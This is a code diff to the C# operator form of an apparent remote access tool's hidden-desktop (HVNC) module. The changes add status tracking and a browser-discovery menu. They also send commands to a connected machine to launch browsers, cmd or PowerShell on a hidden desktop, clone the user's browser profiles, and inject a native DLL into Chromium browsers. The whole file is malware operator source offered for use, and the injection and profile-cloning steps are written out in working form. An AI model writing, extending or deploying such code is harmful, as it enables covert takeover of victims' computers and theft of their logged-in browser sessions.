@@ -8,6 +8,7 @@ using Pulsar.Server.Helper;
 using Pulsar.Server.Messages;
 using Pulsar.Server.Networking;
 using Pulsar.Server.Utilities;
+using Pulsar.Server.Controls;
 using System;
 using System.Collections.Generic;
 using System.Drawing;
@@ -17,6 +18,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using Pulsar.Common.Messages.Monitoring.HVNC;
+using Pulsar.Server.Controls.Wpf;
 
 namespace Pulsar.Server.Forms
 {
@@ -51,6 +53,7 @@ namespace Pulsar.Server.Forms
         /// The message handler for handling the communication with the client.
         /// </summary>
         private readonly HVNCHandler _hVNCHandler;
+        private readonly HVNCWorkspaceViewModel _workspaceViewModel = new HVNCWorkspaceViewModel();
 
         /// <summary>
         /// Stopwatch used to suppress FPS display during the initial seconds of the stream,
@@ -106,6 +109,7 @@ namespace Pulsar.Server.Forms
             DarkModeManager.ApplyDarkMode(this);
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
             UpdateInputButtonsVisualState();
+            SetStatusLabels("Session: Ready", "Stream: Idle", "Launch: Idle");
         }
 
         private void UpdateInputButtonsVisualState()
@@ -113,6 +117,22 @@ namespace Pulsar.Server.Forms
             UpdateButtonState(btnMouse, _enableMouseInput);
             UpdateButtonState(btnKeyboard, _enableKeyboardInput);
             UpdateButtonState(btnBiDirectionalClipboard, _enableBidirectionalClipboard);
+        }
+
+        private void SetStatusLabels(string session, string stream, string launch)
+        {
+            if (InvokeRequired)
+            {
+                BeginInvoke(new Action<string, string, string>(SetStatusLabels), session, stream, launch);
+                return;
+            }
+
+            if (statusSession != null) statusSession.Text = session;
+            if (statusStream != null) statusStream.Text = stream;
+            if (statusLaunch != null) statusLaunch.Text = launch;
+            _workspaceViewModel.SessionState = session.Replace("Session: ", string.Empty);
+            _workspaceViewModel.StreamState = stream.Replace("Stream: ", string.Empty);
+            _workspaceViewModel.LaunchState = launch.Replace("Launch: ", string.Empty);
         }
 
         private void UpdateButtonState(Button button, bool enabled)
@@ -149,6 +169,8 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.ClientState += ClientDisconnected;
             _hVNCHandler.ProgressChanged += UpdateImage;
+            _hVNCHandler.ProcessStatusChanged += ProcessStatusChanged;
+            _hVNCHandler.BrowserCatalogChanged += BrowserCatalogChanged;
             MessageHandler.Register(_hVNCHandler);
         }
 
@@ -159,7 +181,39 @@ namespace Pulsar.Server.Forms
         {
             MessageHandler.Unregister(_hVNCHandler);
             _hVNCHandler.ProgressChanged -= UpdateImage;
+            _hVNCHandler.ProcessStatusChanged -= ProcessStatusChanged;
+            _hVNCHandler.BrowserCatalogChanged -= BrowserCatalogChanged;
             _connectClient.ClientState -= ClientDisconnected;
+        }
+
+        private void ProcessStatusChanged(HVNCProcessStatus status)
+        {
+            if (InvokeRequired)
+            {
+                BeginInvoke(new Action<HVNCProcessStatus>(ProcessStatusChanged), status);
+                return;
+            }
+
+            string stage = status.Stage switch
+            {
+                HVNCProcessStage.Queued => "Launch queued",
+                HVNCProcessStage.Validating => "Validating launch",
+                HVNCProcessStage.Cloning => "Cloning browser profile",
+                HVNCProcessStage.Starting => "Starting process",
+                HVNCProcessStage.Suspended => "Process suspended",
+                HVNCProcessStage.Injecting => "Injecting native DLL",
+                HVNCProcessStage.Resuming => "Resuming process",
+                HVNCProcessStage.Started => "Process started",
+                HVNCProcessStage.Completed => "Launch completed",
+                HVNCProcessStage.Cancelled => "Launch cancelled",
+                HVNCProcessStage.Failed => "Launch failed",
+                HVNCProcessStage.TimedOut => "Launch timed out",
+                _ => "Launch update"
+            };
+
+            this.Text = string.Format("{0} - {1}", WindowHelper.GetWindowTitle("HVNC", _connectClient), stage);
+            statusLaunch.Text = "Launch: " + stage;
+            Debug.WriteLine($"HVNC launch [{status.LaunchId}] {stage}: {status.Message}");
         }
 
         /// <summary>
@@ -197,6 +251,7 @@ namespace Pulsar.Server.Forms
         private void StartStream(bool useGPU)
         {
             ToggleConfigurationControls(true);
+            SetStatusLabels("Session: Streaming", "Stream: Starting", "Launch: Idle");
 
             picDesktop.Start();
             // Subscribe to the new frame counter.
@@ -218,6 +273,7 @@ namespace Pulsar.Server.Forms
         private void StopStream()
         {
             ToggleConfigurationControls(false);
+            SetStatusLabels("Session: Ready", "Stream: Stopped", "Launch: Idle");
 
             picDesktop.Stop();
             // Unsubscribe from the frame counter. It will be re-created when starting again.
@@ -277,9 +333,14 @@ namespace Pulsar.Server.Forms
         private void DisplaysChanged(object sender, int displays)
         {
             cbMonitors.Items.Clear();
+            var monitorNames = new string[displays];
             for (int i = 0; i < displays; i++)
+            {
                 cbMonitors.Items.Add($"Display {i + 1}");
+                monitorNames[i] = $"Display {i + 1}";
+            }
             cbMonitors.SelectedIndex = 0;
+            _workspaceViewModel.SetMonitors(monitorNames);
         }
 
         /// <summary>
@@ -294,6 +355,18 @@ namespace Pulsar.Server.Forms
 
         private void UpdateImage(object sender, Bitmap bmp)
         {
+            if (statusStream != null && statusStream.Text != "Stream: Live")
+            {
+                SetStatusLabels("Session: Streaming", "Stream: Live", statusLaunch?.Text ?? "Launch: Idle");
+            }
+
+            var telemetry = _hVNCHandler.GetFrameTelemetry(_hVNCHandler.SessionId);
+            statusStream.Text = $"Stream: Live | FPS {_hVNCHandler.CurrentFps:0.0} | Queue {telemetry.CurrentBacklog}/{telemetry.MaximumBacklog}";
+            _workspaceViewModel.CaptureFps = telemetry.CaptureFps;
+            _workspaceViewModel.RenderFps = telemetry.RenderFps;
+            _workspaceViewModel.Backlog = telemetry.CurrentBacklog;
+            _workspaceViewModel.MaximumBacklog = telemetry.MaximumBacklog;
+
             if (!_stopwatch.IsRunning)
                 _stopwatch.Start();
 
@@ -337,6 +410,8 @@ namespace Pulsar.Server.Forms
         private void FrmHVNC_Load(object sender, EventArgs e)
         {
             this.Text = WindowHelper.GetWindowTitle("HVNC", _connectClient);
+            SetStatusLabels("Session: Connected", "Stream: Idle", "Launch: Idle");
+            BuildLaunchMenu();
 
             OnResize(EventArgs.Empty); // trigger resize event to align controls 
 
@@ -347,6 +422,125 @@ namespace Pulsar.Server.Forms
             _hVNCHandler.RefreshDisplays();
 
             cbMonitors.SelectedIndex = 0;
+            RefreshBrowserCatalog();
+            _connectClient.Send(new GetHVNCLaunchHistory
+            {
+                SessionId = _hVNCHandler.SessionId
+            });
+        }
+
+        private void BuildLaunchMenu()
+        {
+            contextMenuStrip.SuspendLayout();
+            contextMenuStrip.Items.Clear();
+
+            contextMenuStrip.Items.Add(CreateMenuHeader("Desktop"));
+            contextMenuStrip.Items.Add(menuItem1);
+            contextMenuStrip.Items.Add(new ToolStripSeparator());
+
+            contextMenuStrip.Items.Add(CreateMenuHeader("Browsers"));
+            RebuildBrowserMenuItems();
+            contextMenuStrip.Items.Add(startGenericChromiumToolStripMenuItem);
+            cLONEBROWSERPROFILEToolStripMenuItem.Text = "Clone browser profile";
+            cLONEBROWSERPROFILEToolStripMenuItem.ToolTipText = "Clone browser profile data before launch.";
+            contextMenuStrip.Items.Add(cLONEBROWSERPROFILEToolStripMenuItem);
+            contextMenuStrip.Items.Add(new ToolStripSeparator());
+
+            contextMenuStrip.Items.Add(CreateMenuHeader("Shell"));
+            contextMenuStrip.Items.Add(startCmdToolStripMenuItem);
+            contextMenuStrip.Items.Add(startPowershellToolStripMenuItem);
+            contextMenuStrip.Items.Add(new ToolStripSeparator());
+
+            contextMenuStrip.Items.Add(CreateMenuHeader("Tools"));
+            contextMenuStrip.Items.Add(startDiscordToolStripMenuItem);
+            contextMenuStrip.Items.Add(startCustomPathToolStripMenuItem);
+
+            contextMenuStrip.ResumeLayout();
+        }
+
+        private static ToolStripMenuItem CreateMenuHeader(string text)
+        {
+            return new ToolStripMenuItem(text)
+            {
+                Enabled = false,
+                Font = new Font("Segoe UI Semibold", 8.25f, FontStyle.Bold),
+                ForeColor = Color.FromArgb(160, 160, 160)
+            };
+        }
+
+        private void RebuildBrowserMenuItems()
+        {
+            if (_hVNCHandler.BrowserCatalog == null ||
+                _hVNCHandler.BrowserCatalog.Length == 0)
+            {
+                return;
+            }
+
+            var refreshItem = new ToolStripMenuItem("Refresh browser discovery");
+            refreshItem.Click += (_, _) => RefreshBrowserCatalog();
+            contextMenuStrip.Items.Add(refreshItem);
+
+            foreach (var browser in _hVNCHandler.BrowserCatalog)
+            {
+                var item = new ToolStripMenuItem(
+                    browser.Installed
+                        ? $"Start {browser.DisplayName}"
+                        : $"{browser.DisplayName} (not detected)")
+                {
+                    Enabled = browser.Installed
+                };
+
+                item.Click += (_, _) => SendBrowserLaunch(browser);
+                contextMenuStrip.Items.Add(item);
+            }
+        }
+
+        private void BrowserCatalogChanged(HVNCBrowserDefinition[] browsers)
+        {
+            if (InvokeRequired)
+            {
+                BeginInvoke(new Action<HVNCBrowserDefinition[]>(BrowserCatalogChanged), browsers);
+                return;
+            }
+
+            SetStatusLabels(
+                "Session: Connected",
+                statusStream?.Text ?? "Stream: Idle",
+                "Launch: Browsers discovered");
+            BuildLaunchMenu();
+        }
+
+        private void RefreshBrowserCatalog()
+        {
+            _connectClient.Send(new GetHVNCBrowserCatalog
+            {
+                SessionId = _hVNCHandler.SessionId,
+                Refresh = true
+            });
+        }
+
+        private void SendBrowserLaunch(HVNCBrowserDefinition browser)
+        {
+            if (browser == null || !browser.Installed)
+                return;
+
+            SendLaunch(new StartHVNCProcess
+            {
+                Path = browser.BrowserId switch
+                {
+                    "chrome" => "Chrome",
+                    "edge" => "Edge",
+                    "brave" => "Brave",
+                    "opera" => "Opera",
+                    "opera-gx" => "OperaGX",
+                    "firefox" => "Mozilla",
+                    _ => browser.DisplayName
+                },
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
+                DllBytes = browser.BrowserId == "firefox"
+                    ? null
+                    : GetHVNCInjectionDllBytes()
+            });
         }
 
         /// <summary>
@@ -587,12 +781,52 @@ namespace Pulsar.Server.Forms
                 return null;
             }
         }
+
+        private void SendLaunch(StartHVNCProcess message)
+        {
+            bool requiresNative =
+                message.Path == "Chrome" ||
+                message.Path == "Edge" ||
+                message.Path == "Brave" ||
+                message.Path == "Opera" ||
+                message.Path == "OperaGX" ||
+                message.Path == "GenericChromium";
+
+            if (requiresNative && (message.DllBytes == null || message.DllBytes.Length == 0))
+            {
+                ProcessStatusChanged(new HVNCProcessStatus
+                {
+                    Stage = HVNCProcessStage.Failed,
+                    Message = "HVNC native DLL is missing or invalid.",
+                    LaunchId = Guid.NewGuid().ToString("N")
+                });
+                MessageBox.Show(
+                    "The HVNC native component is unavailable.\n\nExpected: HVNCInjection.x64.dll in the server executable directory.",
+                    "Launch blocked",
+                    MessageBoxButtons.OK,
+                    MessageBoxIcon.Warning);
+                return;
+            }
+
+            message.SessionId = string.IsNullOrWhiteSpace(_hVNCHandler.SessionId)
+                ? Guid.NewGuid().ToString("N")
+                : _hVNCHandler.SessionId;
+            message.LaunchId = Guid.NewGuid().ToString("N");
+            _connectClient.Send(message);
+            ProcessStatusChanged(new HVNCProcessStatus
+            {
+                SessionId = message.SessionId,
+                LaunchId = message.LaunchId,
+                Stage = HVNCProcessStage.Queued,
+                Message = $"Queued {message.Path} launch."
+            });
+        }
         #endregion
 
         #region MenuItems
         private void menuItem1_Click(object sender, EventArgs e)
         {
-            _connectClient.Send(new StartHVNCProcess
+            SendLaunch(new StartHVNCProcess
             {
                 Path = "Explorer"
             });
@@ -600,7 +834,7 @@ namespace Pulsar.Server.Forms
 
         private void menuItem2_Click(object sender, EventArgs e)
         {
-            _connectClient.Send(new StartHVNCProcess
+            SendLaunch(new StartHVNCProcess
             {
                 Path = "Chrome",
                 DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
@@ -610,7 +844,7 @@ namespace Pulsar.Server.Forms
 
         private void startEdgeToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            _connectClient.Send(new StartHVNCProcess
+            SendLaunch(new StartHVNCProcess
             {
                 Path = "Edge",
                 DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
@@ -620,7 +854,7 @@ namespace Pulsar.Server.Forms
 
         private void startBraveToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            _connectClient.Send(new StartHVNCProcess
+            SendLaunch(new StartHVNCProcess
             {
                 Path = "Brave",
                 DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
@@ -630,7 +864,7 @@ namespace Pulsar.Server.Forms
 
         private void startOperaToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            _connectClient.Send(new StartHVNCProcess
+            SendLaunch(new StartHVNCProcess
             {
                 Path = "Opera",
                 DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
@@ -640,7 +874,7 @@ namespace Pulsar.Server.Forms
 
         private void startOperaGXToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            _connectClient.Send(new StartHVNCProcess
+            SendLaunch(new StartHVNCProcess
             {
                 Path = "OperaGX",
                 DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
@@ -650,7 +884,7 @@ namespace Pulsar.Server.Forms
 
         private void startFirefoxToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            _connectClient.Send(new StartHVNCProcess
+            SendLaunch(new StartHVNCProcess
             {
                 Path = "Mozilla",
                 DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
@@ -659,7 +893,7 @@ namespace Pulsar.Server.Forms
 
         private void startCmdToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            _connectClient.Send(new StartHVNCProcess
+            SendLaunch(new StartHVNCProcess
             {
                 Path = "Cmd"
             });
@@ -667,7 +901,7 @@ namespace Pulsar.Server.Forms
 
         private void startPowershellToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            _connectClient.Send(new StartHVNCProcess
+            SendLaunch(new StartHVNCProcess
             {
                 Path = "Powershell"
             });
@@ -688,15 +922,11 @@ namespace Pulsar.Server.Forms
         private void cLONEBROWSERPROFILEToolStripMenuItem_Click(object sender, EventArgs e)
         {
             cLONEBROWSERPROFILEToolStripMenuItem.Checked = !cLONEBROWSERPROFILEToolStripMenuItem.Checked;
-
-            if (cLONEBROWSERPROFILEToolStripMenuItem.Checked)
-            {
-                cLONEBROWSERPROFILEToolStripMenuItem.Text = "CLONE BROWSER PROFILE";
-            }
-            else
-            {
-                cLONEBROWSERPROFILEToolStripMenuItem.Text = "DIRECT START BROWSER";
-            }
+            cLONEBROWSERPROFILEToolStripMenuItem.Text = "Clone browser profile";
+            cLONEBROWSERPROFILEToolStripMenuItem.ToolTipText =
+                cLONEBROWSERPROFILEToolStripMenuItem.Checked
+                    ? "Profile cloning is enabled."
+                    : "Direct browser launch is enabled.";
         }
 
         #endregion
@@ -711,8 +941,11 @@ namespace Pulsar.Server.Forms
         {
             if (_remoteDesktopWidth == 0 || picDesktop.Width == 0)
                 return x;
-            
-            return (int)Math.Round((double)x * _remoteDesktopWidth / picDesktop.Width);
+
+            return HVNCCoordinateTransform.ScaleToRemote(
+                x,
+                picDesktop.Width,
+                _remoteDesktopWidth);
         }
 
         /// <summary>
@@ -723,8 +956,11 @@ namespace Pulsar.Server.Forms
         {
             if (_remoteDesktopHeight == 0 || picDesktop.Height == 0)
                 return y;
-            
-            return (int)Math.Round((double)y * _remoteDesktopHeight / picDesktop.Height);
+
+            return HVNCCoordinateTransform.ScaleToRemote(
+                y,
+                picDesktop.Height,
+                _remoteDesktopHeight);
         }
 
         private void PicDesktop_MouseDown(object sender, MouseEventArgs e)
